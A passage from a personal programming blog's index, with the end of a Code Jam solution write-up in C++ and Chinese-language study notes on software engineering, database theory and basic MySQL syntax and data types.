class="string">'0'</span>+ans[s]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">1</span>;c&lt;=t;c++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, ch);</span><br><span class="line">        <span class="keyword">int</span> l=<span class="built_in">strlen</span>(ch);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x=ch[i]-<span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>) &#123; ans1[i]=ans2[i]=<span class="number">0</span>;<span class="keyword">continue</span>; &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">1</span>; u&lt;=x; u++) <span class="keyword">if</span>(u!=<span class="number">4</span> &amp;&amp; x-u!=<span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(rand()&amp;<span class="number">1</span>) &#123;</span><br><span class="line">        ans1[i]=u, ans2[i]=x-u;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ans1[i]=x-u, ans2[i]=u;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: "</span>,c);</span><br><span class="line">        out(l, ans1), <span class="built_in">putchar</span>(<span class="string">' '</span>), out(l, ans2), <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h3><p><strong>Description</strong><br>一个$n\times n$的网格，每次只能向右或向下，给出一条路径，让你不发生路径覆盖的从左上走到右下。<br>$T\leqslant 100 , n\leqslant 5\times 10^5$</p><p><strong>Solution</strong><br>…<br>其实输出对称的路径就能过…</p><p><strong>Code</strong><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100005</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ch[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, n, l;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">1</span>; c&lt;=t; c++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, ch);</span><br><span class="line">        l=<span class="built_in">strlen</span>(ch);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=l<span class="number">-1</span>; ~i; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ch[i]==<span class="string">'S'</span>) ch[i]=<span class="string">'E'</span>;</span><br><span class="line">            <span class="keyword">else</span> ch[i]=<span class="string">'S'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %s\n"</span>, c, ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>后面两道题连开都没开..<br>然后时间就到了…<br>昨天开始的，现在已经结束了…差点没赶上..</p>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> codejam </tag>
            
            <tag> program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程基础笔记</title>
      <link href="/blog/note-software-project/"/>
      <url>/blog/note-software-project/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>软件：<br>软件生命周期：将软件产品从提出、实现、使用维护到停止使用退役的过程。分为三个阶段：定义阶段、开发阶段、维护阶段。<br>软件定义阶段的任务是：确定软件开发工作必须完成的目标；确定工程的可行性。<br>软件开发阶段的任务是：具体完成设计和实现定义阶段所定义的软件，通常包括总体设计、详细设计、编码和测试。总体设计和系统设计又称为系统设计，编码和测试又称为系统实现。<br>软件维护阶段的任务是：使软件在运行中持久的满足用户的需要。</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> softwareproject </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库笔记</title>
      <link href="/blog/note-database/"/>
      <url>/blog/note-database/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>数据：描述事物的符号记录<br>数据库：数据的集合，具有统一的结构形式并存放于统一的存储介质内，是多种应用数据的集成，并可被各个应用程序所共享。<br>数据库管理系统：是数据库的机构，是一种系统软件，负责数据库中的数据组织、数据操纵、数据维护、控制及保护和数据服务等。<br>数据定义语言(Data Definition Language, DDL)：数据的模式定义和数据的物理存取构建。<br>数据操纵语言(Data Manipulation Language, DML)：负责数据的操纵，包括查询及增、删、改等操作。<br>数据控制语言(Data Control Language, DCL)：负责数据的完整性、安全性的定义与检查以及并发控制、故障恢复等功能。<br>结构化查询语言(Structured Query Language)：SQL是高级非过程性编程语言<br>数据库管理员：对数据库的规划、设计、维护、监视。<br>数据库系统：由数据库（数据）、数据库管理系统（软件）、数据库管理员（人员）、硬件平台、软件平台组成。<br>数据库应用系统：是数据库系统再加上应用软件及应用界面。</p><h3 id="数据库系统的基本特点"><a href="#数据库系统的基本特点" class="headerlink" title="数据库系统的基本特点"></a>数据库系统的基本特点</h3><ol><li>数据的集成性</li><li>数据的高共享性与低冗余性</li><li>数据的独立性</li><li>数据的统一管理与控制</li></ol><h3 id="数据库系统的内部结构体系"><a href="#数据库系统的内部结构体系" class="headerlink" title="数据库系统的内部结构体系"></a>数据库系统的内部结构体系</h3><p>数据模式是数据库系统中数据结构的一种表现形式。<br>三级模式：概念级模式、内部级模式、外部级模式<br>二级映射：概念级到内部级的映射、外部级到概念级的映射</p><h3 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h3><p>数据模型是数据特征的抽象，从抽象层次上描述了系统的静态特征、动态行为和约束条件，为数据库系统的信息表示与操作提供了一个抽象的框架。<br>数据模型描述的内容有三部分，他们是数据结构、数据操作与数据约束。<br>数据模式按不同的应用层次分为三种类型，它们是概念数据模型、逻辑数据模型(层次模型、网状模型、关系模型、面向对象模型)、物理数据模型。</p><p>E-R模型：实体、属性、联系<br>层次模型：树形结构<br>网状模型：不加任何条件限制的无向图<br>关系模型：采用二维表来表示，满足一定条件的二维表称为关系；二维表中凡能唯一标识元祖的最小属性集称为该表的键或码。</p><h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><ol><li>插入</li><li>删除</li><li>修改</li><li>查询：投影运算、选择运算、笛卡尔积运算</li><li>交运算</li><li>除运算</li><li>连接与自然连接</li></ol><h3 id="数据库设计与管理"><a href="#数据库设计与管理" class="headerlink" title="数据库设计与管理"></a>数据库设计与管理</h3><p>数据库设计：基本任务是根据用户对象的信息需求、处理需求和数据库支持环境设计出数据模式。四个阶段：需求分析、概念设计、逻辑设计、物理设计。<br>需求分析：结构化分析方法(自顶向下、逐层分解)<br>数据字典：是各类数据描述的集合，包括：数据项、数据结构、数据流、数据储存、处理过程<br>概念设计：目的是分析数据间内在语义关联，在此基础上建议一个数据的抽象模型；方法：集中式模型设计法、视图集成设计法；过程：选择局部应用、视图设计(自顶向下、由底向上、由内向外)、视图集成</p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL笔记</title>
      <link href="/blog/note-mysql/"/>
      <url>/blog/note-mysql/</url>
      
        <content type="html"><![CDATA[<p>: colon<br>; semicolon</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>SQL(Structured Query Language)</p><h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul><li>Open source(开源)</li><li>Scalable(可伸缩)</li><li>Portable(可移植)</li><li>Works with client/server and embedded architecture(使用客户端/服务端嵌入式架构)</li><li>High performance(高性能)</li><li>Low TCO(低成本)</li><li>Reliable(可靠)</li><li>Easy to use(易于使用)</li><li>Secure(安全)</li><li>High availability(高可用性)</li></ul><p>最小屏幕分辨率$1280\times 1024$, 推荐$1920\times 1200$及以上</p><h3 id="Database-Query-Language"><a href="#Database-Query-Language" class="headerlink" title="Database Query Language"></a>Database Query Language</h3><h4 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h4><p>It is used to define and modify the structure the database objects, such as tables, views, and indexs.<br>数据定义语言(Data Definition Language, DDL)：数据的模式定义和数据的物理存取构建。</p><ul><li>CREATE</li><li>ALTER</li><li>RENAME</li><li>DROP</li><li>TRUNCATE</li></ul><h4 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h4><p>Is used to manipulate the data in database objects.<br>数据操纵语言(Data Manipulation Language, DML)：负责数据的操纵，包括查询及增、删、改等操作。</p><ul><li>INSERT</li><li>UPDATE</li><li>DELETE</li><li>SELECT</li></ul><h4 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h4><p>Is used to control the access to the objects in the database.<br>数据控制语言(Data Control Language, DCL)：负责数据的完整性、安全性的定义与检查以及并发控制、故障恢复等功能。</p><ul><li>GRANT(to assign access permissions to the users on the database objects.)</li><li>REVOKE(to deny permissions)</li></ul><h3 id="Layered-architecture"><a href="#Layered-architecture" class="headerlink" title="Layered architecture"></a>Layered architecture</h3><h4 id="Application-layer"><a href="#Application-layer" class="headerlink" title="Application layer"></a>Application layer</h4><p>Administrative interface and utilities<br>Client interfaces and utilities<br>Query interface and utilities</p><h4 id="Logical-layer"><a href="#Logical-layer" class="headerlink" title="Logical layer"></a>Logical layer</h4><p>Query processor subsystem<br>Transaction management subsystem<br>Recovery management subsystem<br>Storge management subsystem</p><p>储存引擎(Storage engines)</p><ul><li>InnoDB(default)</li><li>MyISAM(supports full-text search indexs.)</li><li>Memory(Nontransaction-safe storage engine, supports temporary tables types and stores tables in memory rather than in secondary storage devices.)</li></ul><h4 id="Physical-layer"><a href="#Physical-layer" class="headerlink" title="Physical layer"></a>Physical layer</h4><h3 id="MySql登录"><a href="#MySql登录" class="headerlink" title="MySql登录"></a>MySql登录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -P 端口号 -h mysql主机名\ip -u root(用户名) -p password dbname</span><br><span class="line">mysql -P 3306 -h localhost -u root -p sakila(DatabaseName)</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">mysql <span class="comment">--port=port_num --host=hostname --user username --password=password dbname</span></span><br></pre></td></tr></table></figure><p>最简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p><h3 id="MySQL-commands"><a href="#MySQL-commands" class="headerlink" title="MySQL commands"></a>MySQL commands</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Help or \h or ?</span><br><span class="line">Eg. Help show</span><br><span class="line">Clear or \c</span><br><span class="line">Eg. Clear</span><br><span class="line">Connect or \r</span><br><span class="line">Eg. Connect sakila </span><br><span class="line">Quit or \q</span><br><span class="line">Eg. Quit</span><br><span class="line">Status or \s</span><br><span class="line">Eg. Status</span><br><span class="line">Delimiter or \d</span><br><span class="line">Eg. Delimiter &amp;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="Database-Objects"><a href="#Database-Objects" class="headerlink" title="Database Objects"></a>Database Objects</h3><h4 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h4><p>A table contains data int rows and columns. It provides a structured organization of data. It offers a provision for maintaining data integrity by allowing users to:<br>Store only the data that satisfies certain pre-defined conditions.<br>Perform only those operations on the data that do not violate the conditions.</p><h4 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h4><p>An index is an internal table structure that MySQL uses to provide quick access to the rows of a table, based on the values of one or more columns. An index is similar to the index of a book.</p><h4 id="View"><a href="#View" class="headerlink" title="View"></a>View</h4><p>A view is a virtual table that provides access to a subset of columns from one or more related tables.</p><h4 id="Stored-procedure"><a href="#Stored-procedure" class="headerlink" title="Stored procedure"></a>Stored procedure</h4><p>A stored procedure is a named block of SQL and procedural statements that are stored in the server and executed as a single unit.</p><h4 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h4><p>A function is a named block of SQL and procedural statements that are stored under one name and return a value.</p><h4 id="Trigger"><a href="#Trigger" class="headerlink" title="Trigger"></a>Trigger</h4><p>A trigger is a named object associated with a table, and comprises a block of SQL statements. A trigger is invoked automatically whenever an event on the assoociated table occurs.</p><h3 id="Types-of-Databases"><a href="#Types-of-Databases" class="headerlink" title="Types of Databases"></a>Types of Databases</h3><p>User-defined Databases<br>System Databases</p><ul><li>information_schema</li><li>mysql</li><li>performance_schema</li></ul><h3 id="建立数据库"><a href="#建立数据库" class="headerlink" title="建立数据库"></a>建立数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] &lt;database_name&gt;</span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> &lt;character_set_name&gt;]</span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> &lt;collation_name&gt;]</span><br></pre></td></tr></table></figure><p>The default character in MySQL is latin1.<br>big5 supports the Chinese language. </p><h3 id="使用数据库"><a href="#使用数据库" class="headerlink" title="使用数据库"></a>使用数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USE</span> &lt;database_name&gt;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">DATABASES</span>;</span><br></pre></td></tr></table></figure><h3 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> &lt;database_name&gt;</span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> &lt;character_set_name&gt;]</span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> &lt;collation_name&gt;]</span><br></pre></td></tr></table></figure><p>查询使用的character set<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span>;</span><br></pre></td></tr></table></figure></p><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> database_name;</span><br></pre></td></tr></table></figure><p>MySQL does not allow deleting system databases.</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>Numeric<br>String<br>Date</p><h4 id="Integer-Data-Types"><a href="#Integer-Data-Types" class="headerlink" title="Integer Data Types"></a><strong>Integer Data Types</strong></h4><div class="table-container"><table><thead><tr><th style="text-align:center">Data type</th><th>Range for signed integers</th><th>Range for unsigned integers</th><th>Storage(Bytes)</th></tr></thead><tbody><tr><td style="text-align:center">TINYINT</td><td>-128 to 127</td><td>0 to 255</td><td>1</td></tr><tr><td style="text-align:center">SMALLINT</td><td>-32,768 to 32,767</td><td>0 to 65535</td><td>2</td></tr><tr><td style="text-align:center">MEDIUMINT</td><td>-83,88,608 to 83,88,607</td><td>0 to 16777215</td><td>3</td></tr><tr><td style="text-align:center">INT / INTEGER</td><td>-2,147,483,648 to 2,147,483,647</td><td>0 to 4294967295</td><td>4</td></tr><tr><td style="text-align:center">BIGINT</td><td>-9,223,372,036,854,775,808 to 9,223,372,036,854,775,807</td><td>0 to 18446744073709551615</td><td>8</td></tr></tbody></table></div><p>Fractional Data Types</p><div class="table-container"><table><thead><tr><th style="text-align:center">Data type</th><th>Range</th><th>Used to store</th><th>Storage(Bytes)</th></tr></thead><tbody><tr><td style="text-align:center">FLOAT</td><td>-3.402823466E+38 to -1.175494351E-38, 0 and 1.175494351E-38 to 3.402823466E+38</td><td>Fractional value with floating single-precision</td><td>4</td></tr><tr><td style="text-align:center">DOUBLE(p,s) PRECISION(p,s) REAL(p,s)</td><td>-1.7976931348623157E+308 to -2.2250738585072014E-308, 0 and 2.2250738585072014E-308 to 1.7976931348623157E+308</td><td>Fractional value with floating double- precision and scale</td><td>8</td></tr><tr><td style="text-align:center">DECIMAL(p,s) DEC(p,s) NUMERIC(p,s) FIXED(p,s)</td><td>Depends on values specified in the column definition</td><td>Fractional value with fixed precision and scale</td><td>NA</td></tr></tbody></table></div><h4 id="Bit-Data-Type"><a href="#Bit-Data-Type" class="headerlink" title="Bit Data Type"></a><strong>Bit Data Type</strong></h4><p>BIT(M)</p><p>表示方法b’1001’</p><h4 id="String"><a href="#String" class="headerlink" title="String"></a><strong>String</strong></h4><div class="table-container"><table><thead><tr><th>Data type</th><th style="text-align:center">Range</th><th>Used to store</th></tr></thead><tbody><tr><td>CHAR(n)</td><td style="text-align:center">n characters, 1 &lt;= n &lt;= 255</td><td>Fixed length</td></tr><tr><td>VARCHAR(n)</td><td style="text-align:center">n characters, 1 &lt;=n &lt;= 255</td><td>Variable length</td></tr><tr><td>TINYTEXT</td><td style="text-align:center">1 to 255 characters</td><td>Variable length</td></tr><tr><td>TEXT</td><td style="text-align:center">1 to 65,535 characters</td><td>Variable length</td></tr><tr><td>MEDIUMTEXT</td><td style="text-align:center">1 to 16,777,215 characters</td><td>Variable length</td></tr><tr><td>LONGTEXT</td><td style="text-align:center">1 to 4,294,967,295 characters</td><td>Variable length</td></tr><tr><td>BINARY(n)</td><td style="text-align:center">n bytes, 1&lt;= n &lt;= 255</td><td>Fixed length</td></tr><tr><td>VARBINARY(N)</td><td style="text-align:center">n bytes, 1&lt;=n &lt;= 255</td><td>Variable length</td></tr><tr><td>TINYBLOB</td><td style="text-align:center">255 characters(355 bytes)</td><td>Variable length</td></tr><tr><td>BLOB</td><td style="text-align:center">1 to 65,535 characters(64KB)</td><td>Variable length</td></tr><tr><td>MEDIUMBLOB</td><td style="text-align:center">1 to 16,777,215 characters(16MB)</td><td>Variable length</td></tr><tr><td>LONGBLOB</td><td style="text-align:center">1 to 4,294,967,295 characters(4GB)</td><td>Variable length</td></tr></tbody></table></div><p>BLOB 类型可以储存图片</p><h4 id="Date"><a href="#Date" class="headerlink" title="Date"></a><strong>Date</strong></h4><div class="table-container"><table><thead><tr><th>Data type</th><th>Range</th><th style="text-align:center">Used to store</th></tr></thead><tbody><tr><td>DATE</td><td>1000-01-01 through 9999-12-31</td><td style="text-align:center">Date data</td></tr><tr><td>DATETIME</td><td>1000-01-01 00:00:00 through 9999-12-31 23:59:59</td><td style="text-align:center">Date and time data</td></tr><tr><td>TIMESTAMP</td><td>1970-01-01 00:00:00 2037-12-31</td><td style="text-align:center">Date and time value that is updated with the current date and time value of system, whenever a record is updated or inserted into the table</td></tr><tr><td>YEAR</td><td>1901 to 2155</td><td style="text-align:center">Year data</td></tr><tr><td>TIME</td><td>-838:59:59 to 838:59:59</td><td style="text-align:center">Time data</td></tr></tbody></table></div><h4 id="ENUM"><a href="#ENUM" class="headerlink" title="ENUM"></a><strong>ENUM</strong></h4><p>用一个数字index表示数据</p><p>eg.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> tb(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">status</span> enum(<span class="string">'Married'</span>, <span class="string">'Unmarried'</span>, <span class="string">'Divorced'</span>, <span class="string">'Widow'</span>, <span class="string">'Widower'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb <span class="keyword">values</span>(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a><strong>Set</strong></h4><p>跟ENUM差不多，但是是个集合，取值为子集而不是用index</p><p>Eg.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> tb (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">S <span class="keyword">set</span>(<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb <span class="keyword">value</span>(<span class="number">1</span>, (<span class="string">'A,B,C'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tb;</span><br></pre></td></tr></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><h3 id="创建表格"><a href="#创建表格" class="headerlink" title="创建表格"></a>创建表格</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">TEMPORARY</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] &lt;table_name&gt;(&lt;column_definition&gt; [&#123;, &lt;column_definition&gt;&#125;...])</span><br><span class="line">[<span class="keyword">ENGINE</span> = &#123; <span class="keyword">MEMORY</span> | <span class="keyword">INNODB</span> | <span class="keyword">MERGE</span> | MRG_MYISAM | MYISAM&#125;]</span><br><span class="line"></span><br><span class="line">&lt;column_definition&gt;=</span><br><span class="line">&lt;column_name&gt; &lt;data_type&gt; [<span class="keyword">NOT</span> <span class="literal">NULL</span> | <span class="literal">NULL</span>] [<span class="keyword">DEFAULT</span> &lt;<span class="keyword">value</span>&gt;]</span><br><span class="line">[AUTO_INCREMENT]</span><br></pre></td></tr></table></figure><p>查看表格属性<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESCRIBE</span> table_name [column_name | <span class="string">`value`</span>]</span><br><span class="line"><span class="keyword">DESC</span> Products <span class="string">'P%'</span></span><br></pre></td></tr></table></figure></p><p>查看是数据库中表格<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLES</span></span><br></pre></td></tr></table></figure></p><h3 id="添加约束"><a href="#添加约束" class="headerlink" title="添加约束"></a>添加约束</h3><p>在创建表格时<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[CONSTRAINT constraint_name] PRIMARY KEY(&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">[CONSTRAINT constraint_name] UNIQUE (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">[CONSTRAINT constraint_name] FOREIGN KEY (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...]) REFERENCES master_table_name(&lt;column_name&gt; [&#123;,&lt;column_name&gt;&#125;...])</span><br></pre></td></tr></table></figure></p><h3 id="修改表格"><a href="#修改表格" class="headerlink" title="修改表格"></a>修改表格</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span>   &lt;table_name&gt;</span><br><span class="line">&#123;<span class="keyword">ADD</span> [<span class="keyword">COLUMN</span>] &lt;column_definition&gt; [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> &lt;column_name&gt;]&#125; |</span><br><span class="line">&#123;<span class="keyword">ADD</span> [<span class="keyword">CONSTRAINT</span>] &lt;constraint_name&gt; &lt;constraint_clause&gt; &#125; |</span><br><span class="line">&#123;<span class="keyword">ALTER</span> [<span class="keyword">COLUMN</span>] &lt;column_name&gt; &#123;<span class="keyword">SET</span> <span class="keyword">DEFAULT</span> &lt;<span class="keyword">values</span>&gt; | <span class="keyword">DROP</span> <span class="keyword">DEFAULT</span>&#125;&#125; |</span><br><span class="line">&#123;<span class="keyword">MODIFY</span> [<span class="keyword">COLUMN</span>] &lt;column_definition&gt; [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> &lt;column_name&gt;]&#125; |</span><br><span class="line">&#123;<span class="keyword">DROP</span> [<span class="keyword">COLUMN</span>] &lt;column_name&gt; &#125; |</span><br><span class="line">&#123;<span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span> | <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> constraint_name | <span class="keyword">UNIQUE</span> constraint_name&#125; |</span><br><span class="line">&#123;<span class="keyword">RENAME</span> [<span class="keyword">TO</span>] &lt;new_table_name&gt;&#125;</span><br></pre></td></tr></table></figure><h3 id="Manipulating-Table-Data"><a href="#Manipulating-Table-Data" class="headerlink" title="Manipulating Table Data"></a>Manipulating Table Data</h3><h4 id="Inserting-Data"><a href="#Inserting-Data" class="headerlink" title="Inserting Data"></a>Inserting Data</h4><p>INSERT Statement<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [<span class="keyword">LOW_PRIORITY</span> | <span class="keyword">DELAYED</span>] [<span class="keyword">IGNORE</span>] [<span class="keyword">INTO</span>] &lt;table_name&gt; </span><br><span class="line">&#123;&lt;values_option&gt; | &lt;set_option&gt;&#125;;</span><br><span class="line"></span><br><span class="line">&lt;values_option&gt;=</span><br><span class="line"><span class="keyword">SET</span> &lt;column_name&gt;=&#123;&lt;value_list&gt; | <span class="keyword">DEFAULT</span>&#125;</span><br><span 